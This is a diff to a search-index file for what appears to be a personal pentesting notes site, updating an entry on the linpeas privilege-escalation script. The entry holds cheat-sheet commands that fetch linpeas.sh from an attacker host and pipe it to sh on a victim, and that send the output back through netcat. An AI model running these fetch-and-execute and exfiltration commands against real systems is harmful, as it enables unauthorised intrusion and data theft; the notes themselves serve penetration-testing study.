@@ -722,7 +722,7 @@ window.store = {
         
         "title": "linpeas",
         "tags": ["linux","privesc","pentest","enumeration",],
-        "content": "Execution: Run from memory and send back to attacker:\n# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 \u0026lt; linpeas.sh #Host cat \u0026lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim ", 
+        "content": "See carlospolop : PEASS-ng hacktricks\nExecution: Run from memory and send back to attacker:\n# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 \u0026lt; linpeas.sh #Host cat \u0026lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim ", 
         "url": "https:\/\/kdbed.github.io\/posts\/linpeas\/"
     },
     
